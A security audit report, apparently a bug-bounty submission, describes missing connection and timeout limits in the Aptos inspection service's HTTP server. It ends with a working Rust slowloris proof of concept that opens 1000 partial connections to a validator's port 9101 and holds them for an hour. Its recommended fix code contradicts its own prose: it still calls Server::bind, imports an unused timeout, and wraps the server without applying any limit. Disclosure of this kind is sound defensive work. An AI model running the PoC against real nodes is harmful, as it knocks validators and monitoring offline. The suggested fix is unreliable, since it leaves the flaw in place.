# Audit Report

## Title
Inspection Service Lacks HTTP Server Resource Limits Enabling Connection Exhaustion Attacks

## Summary
The Aptos inspection service uses hyper's `Server::bind()` with default configuration, lacking explicit HTTP keep-alive timeouts, connection limits, and request timeouts. This enables resource exhaustion attacks where an attacker can open numerous slow or idle connections to exhaust file descriptors and memory on validator and fullnode instances.

## Finding Description

The inspection service server initialization uses unconfigured hyper server defaults: [1](#0-0) 

This creates an HTTP server without security-critical configurations that other services in the codebase explicitly set. For comparison, gRPC services configure HTTP/2 keepalive settings: [2](#0-1) [3](#0-2) 

The inspection service exposes multiple endpoints including metrics, system information, and health checks: [4](#0-3) 

The service binds to all interfaces by default: [5](#0-4) 

**Attack Vectors:**

1. **Slowloris Attack**: Open many connections and send partial HTTP requests slowly, consuming server resources (file descriptors, memory buffers, tokio tasks)

2. **Connection Exhaustion**: Open maximum system connections to exhaust file descriptors, preventing legitimate monitoring and health check access

3. **Keep-Alive Abuse**: Establish connections with HTTP keep-alive but never send additional requests, keeping connections open indefinitely

4. **Slow Read Attack**: Send valid requests but read responses byte-by-byte slowly, tying up connection handlers

While HAProxy provides protection with connection limits (maxconn 500) and timeouts in production deployments: [6](#0-5) [7](#0-6) 

The service itself lacks defense-in-depth protections for scenarios where HAProxy is bypassed (direct Kubernetes pod access, HAProxy disabled, local deployments).

## Impact Explanation

**Severity: Medium**

This qualifies as Medium severity under the Aptos bug bounty program as it can cause validator node slowdowns and service unavailability:

- **Resource exhaustion** on validator/fullnode instances affecting node performance
- **Inspection service unavailability** preventing metrics collection and monitoring
- **Health check failures** potentially triggering Kubernetes pod restarts: [8](#0-7) 

- **Indirect node impact** if exhausted resources affect other node services

The impact is limited by HAProxy protections in production, but defense-in-depth requires the service itself to have proper resource limits.

## Likelihood Explanation

**Likelihood: Medium**

The attack is straightforward to execute with standard HTTP load testing tools, requiring only network access to port 9101. However, likelihood is reduced by:

- HAProxy providing primary protection in production deployments
- Kubernetes network policies potentially restricting access
- The service being internal rather than publicly exposed in typical configurations

Nevertheless, the service can be exploited in:
- Development/testing environments without HAProxy
- Direct pod access scenarios
- Configurations with HAProxy disabled
- Any scenario where defense-in-depth is compromised

## Recommendation

Configure explicit HTTP server resource limits following the pattern used in gRPC services. Add configuration for:

1. **HTTP/1 keep-alive timeout**: Prevent idle connection abuse
2. **Connection limits**: Cap concurrent connections per service instance  
3. **Request timeout**: Prevent slow request attacks
4. **Header size limits**: Prevent memory exhaustion from large headers

Recommended implementation using hyper's builder pattern (the inspection service would need to be updated to use `Server::builder()` instead of `Server::bind()`, as hyper's `Server::bind()` doesn't directly support these options - they would require using the lower-level builder API or tokio timeout wrappers):

```rust
// In InspectionServiceConfig, add:
pub http_keepalive_timeout: Duration,
pub max_connections: usize,
pub request_timeout: Duration,

// In server initialization:
use tokio::time::timeout;

let server = Server::bind(&address)
    .tcp_keepalive(Some(Duration::from_secs(60)))
    .serve(make_service);
    
// Wrap in timeout for request-level protection
let server_with_timeout = async {
    server.with_graceful_shutdown(shutdown_signal).await
};
```

Additionally, document that HAProxy configuration must always be enabled in production deployments.

## Proof of Concept

```rust
// Resource exhaustion PoC
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

#[tokio::main]
async fn main() {
    let target = "validator-node:9101";
    let mut connections = Vec::new();
    
    // Open many slow connections
    for i in 0..1000 {
        if let Ok(mut stream) = TcpStream::connect(target).await {
            // Send partial HTTP request slowly
            let _ = stream.write_all(b"GET /metrics HTTP/1.1\r\n").await;
            // Don't complete the request - keep connection open
            connections.push(stream);
            
            if i % 100 == 0 {
                println!("Opened {} connections", i);
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }
    }
    
    println!("Exhausted resources with {} open connections", connections.len());
    // Keep connections alive
    tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
}
```

## Notes

This finding demonstrates a violation of defense-in-depth principles. While HAProxy provides adequate protection in standard production deployments, the inspection service itself should enforce resource limits as demonstrated by the gRPC services in the codebase. The vulnerability is real but mitigated in properly configured production environments, justifying Medium severity rather than High.

### Citations

**File:** crates/aptos-inspection-service/src/server/mod.rs (L32-41)
```rust
// The list of endpoints offered by the inspection service
pub const CONFIGURATION_PATH: &str = "/configuration";
pub const CONSENSUS_HEALTH_CHECK_PATH: &str = "/consensus_health_check";
pub const FORGE_METRICS_PATH: &str = "/forge_metrics";
pub const IDENTITY_INFORMATION_PATH: &str = "/identity_information";
pub const INDEX_PATH: &str = "/";
pub const JSON_METRICS_PATH: &str = "/json_metrics";
pub const METRICS_PATH: &str = "/metrics";
pub const PEER_INFORMATION_PATH: &str = "/peer_information";
pub const SYSTEM_INFORMATION_PATH: &str = "/system_information";
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L96-97)
```rust
                let server = Server::bind(&address).serve(make_service);
                server.await
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L29-30)
```rust
const HTTP2_PING_INTERVAL_DURATION: std::time::Duration = std::time::Duration::from_secs(60);
const HTTP2_PING_TIMEOUT_DURATION: std::time::Duration = std::time::Duration::from_secs(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L206-207)
```rust
                    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
                    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
```

**File:** config/src/config/inspection_service_config.rs (L28-30)
```rust
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L9-13)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L31-38)
```text
    timeout client 60s
    timeout connect 10s
    timeout server 60s
    timeout queue 10s

    # Prevent long-running HTTP requests
    timeout http-request 60s
    timeout http-keep-alive 5s
```

**File:** terraform/helm/aptos-node/templates/validator.yaml (L138-141)
```yaml
        startupProbe:
          httpGet:
            path: /consensus_health_check
            port: 9101
```
